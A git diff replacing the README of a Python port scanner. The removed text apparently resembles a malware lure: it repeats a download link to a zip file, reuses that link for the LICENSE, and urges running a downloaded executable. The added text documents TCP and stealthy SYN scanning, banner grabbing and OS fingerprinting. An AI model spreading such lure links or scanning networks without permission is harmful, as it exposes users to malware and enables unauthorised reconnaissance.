@@ -1,76 +1,128 @@
-# 🔍 advanced-port-scanner - Your Powerful Security Tool
+# Advanced Port Scanner
 
-## 🌟 Features 
-- **6 Scan Types**: Choose the scan that fits your needs.
-- **Multi-Target Support**: Scan multiple devices at once.
-- **WAF/IDS Detection**: Identify firewall and intrusion detection systems.
-- **Web Dashboard**: Access a user-friendly interface to monitor scans.
-- **Comprehensive Security Analysis**: Get detailed reports on vulnerabilities.
-- **Python 3.7+**: Built with modern technology for better performance.
+A professional async TCP port scanner built in Python. Performs high-speed port scanning with service detection, banner grabbing, and OS fingerprinting using `asyncio` for maximum concurrency.
 
-## 🚀 Getting Started
+## Features
 
-To get started with the advanced-port-scanner, you need to download the software from our releases page. 
+- **Async TCP Connect Scan** — non-blocking, high-concurrency scanning powered by asyncio
+- **SYN (Half-Open) Scan** — stealthier scanning using raw sockets (requires root)
+- **Service Detection** — identifies 120+ common services by port number
+- **Banner Grabbing** — captures service banners from open ports for version fingerprinting
+- **OS Fingerprinting** — heuristic OS detection based on TTL values and open port signatures
+- **Flexible Targeting** — single hosts, CIDR ranges (`10.0.0.0/24`), or comma-separated lists
+- **Port Specification** — single ports, ranges (`1-1024`), lists (`22,80,443`), or `--top-ports N`
+- **Multiple Output Formats** — color-coded terminal table, JSON, and CSV
+- **Progress Bar** — real-time scan progress in the terminal
+- **Adjustable Concurrency** — tune performance with `--threads`
 
-[![Download Now](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip)](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip)
+## Scan Types
 
-## 💻 System Requirements 
-- Operating System: Windows 10, macOS, or Linux.
-- Minimum RAM: 2 GB.
-- Disk Space: 100 MB free space.
-- Python: Version 3.7 or above installed on your machine.
+### TCP Connect Scan (default)
 
-## 📥 Download & Install
+Completes the full TCP three-way handshake. Reliable and does not require elevated privileges. Suitable for most use cases.
 
-1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip).
-   
-2. **Select the Latest Version**: Find the latest version listed at the top. Click on it to see assets for download.
+```
+python3 scanner.py --target 192.168.1.1 --ports 1-1024
+```
 
-3. **Download the Application**: Look for the file suitable for your operating system. Click on the link to begin the download.
+### SYN Scan (requires root)
 
-4. **Run the Installer**: 
-   - For Windows: Double-click the `.exe` file you downloaded and follow the installation instructions.
-   - For macOS/Linux: Open your terminal and run the downloaded script or executable.
+Sends a SYN packet and analyses the response without completing the handshake. Faster and less likely to be logged by the target, but requires root privileges for raw socket access.
 
-5. **Launch the Application**: Once installed, you can open the advanced-port-scanner from your program list or using the terminal.
+```
+sudo python3 scanner.py --target 192.168.1.1 --ports 1-1024 --syn
+```
 
-## 📊 Usage Instructions
+## Installation
 
-1. **Open the Application**: Start the advanced-port-scanner from your applications menu.
+```bash
+git clone https://github.com/joemunene/advanced-port-scanner.git
+cd advanced-port-scanner
+pip install -r requirements.txt
+```
 
-2. **Select Scan Type**: Choose from any of the 6 scan types available. Each scan targets different aspects of your network.
+The scanner uses Python's standard library (`asyncio`, `socket`, `struct`) for all core functionality. The only external dependency is `colorama` for terminal colours (optional — the tool degrades gracefully without it).
 
-3. **Enter Targets**: Input the IP addresses or domains you wish to scan. You can enter multiple targets separated by commas.
+**Requirements:** Python 3.10+
 
-4. **Start Scanning**: Click on the "Scan" button to start the process. Monitor the progress on the dashboard.
+## Usage
 
-5. **View Results**: After scanning completes, check the results in the dashboard. You will see vulnerabilities and security issues listed in detail.
+```
+python3 scanner.py --target TARGET [options]
+```
 
-## ⚙️ Troubleshooting
+### Options
 
-If you encounter issues while running the application, try the following steps:
+| Flag | Description | Default |
+|------|-------------|---------|
+| `--target`, `-t` | Host, CIDR range, or comma-separated list | (required) |
+| `--ports`, `-p` | Port spec: `80`, `1-1024`, `22,80,443` | top 100 |
+| `--top-ports N` | Scan the top N common ports | 100 |
+| `--timeout` | Connection timeout in seconds | 1.0 |
+| `--threads` | Max concurrent connections | 200 |
+| `--format`, `-f` | Output format: `table`, `json`, `csv` | table |
+| `--output`, `-o` | Write results to a file | stdout |
+| `--syn` | Use SYN scan (requires root) | off |
 
-- **Check Dependencies**: Ensure you have Python 3.7 or higher installed.
-- **Firewall Settings**: Make sure your firewall is not blocking the application.
-- **Compatibility**: Verify that you are using a supported operating system.
-  
-If problems persist, you can check the "Issues" section on our GitHub repository for solutions or post your question.
+### Examples
 
-## 👥 Community Support
+Scan a single host on the top 1024 ports:
 
-We value community feedback. If you have suggestions or encounter any issues, please feel free to reach out:
+```bash
+python3 scanner.py --target 192.168.1.1 --ports 1-1024
+```
 
-- GitHub Issues: Post your queries and we will address them as soon as possible.
-- Join discussions in our community forums for tips and advice from other users.
+Scan a subnet with the top 50 ports and save JSON output:
 
-## 🔍 Security Notice
+```bash
+python3 scanner.py --target 10.0.0.0/24 --top-ports 50 --format json --output results.json
+```
 
-The advanced-port-scanner is designed for ethical use only. Please ensure you have permission to scan any networks or devices.
+Scan multiple hosts with high concurrency:
 
-## 📄 License 
+```bash
+python3 scanner.py --target 192.168.1.1,192.168.1.2,192.168.1.3 --ports 22,80,443,3306,5432 --threads 500
+```
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip) file for details.
+SYN scan with custom timeout:
 
-For further information and updates, keep an eye on the releases page: [Download Now](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip). 
+```bash
+sudo python3 scanner.py --target 192.168.1.1 --ports 1-1024 --syn --timeout 2
+```
 
-We are committed to making cybersecurity accessible to everyone. Happy scanning!
+## Example Output
+
+```
+==============================================================================
+Scan Report: 192.168.1.1
+------------------------------------------------------------------------------
+  OS Hint  : Linux/Unix (TTL<=64) | Linux/Unix (SSH, no SMB)
+  TTL      : 64
+  Scan Time: 4.32s
+------------------------------------------------------------------------------
+  PORT      STATE     SERVICE           BANNER / INFO
+------------------------------------------------------------------------------
+  22        open      ssh               SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
+  80        open      http              HTTP/1.1 200 OK
+  443       open      https             HTTPS / TLS
+  3306      open      mysql             5.7.42-0ubuntu0.18.04.1
+==============================================================================
+```
+
+## Performance Notes
+
+- Default concurrency of 200 simultaneous connections works well for most networks.
+- For local network scanning, increase to `--threads 500` or higher for faster results.
+- For scanning across the internet, keep concurrency moderate and increase `--timeout` to avoid false negatives.
+- Scanning all 65,535 ports on a single host with 500 threads typically completes in under 60 seconds on a fast connection.
+- The async architecture means "threads" are actually coroutine slots, not OS threads, so memory overhead is minimal.
+
+## Legal Disclaimer
+
+This tool is provided for **authorized security testing and educational purposes only**. Unauthorized port scanning may violate laws and regulations in your jurisdiction. Always obtain explicit written permission before scanning any network or system that you do not own.
+
+The authors assume no liability for misuse of this software.
+
+## License
+
+This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
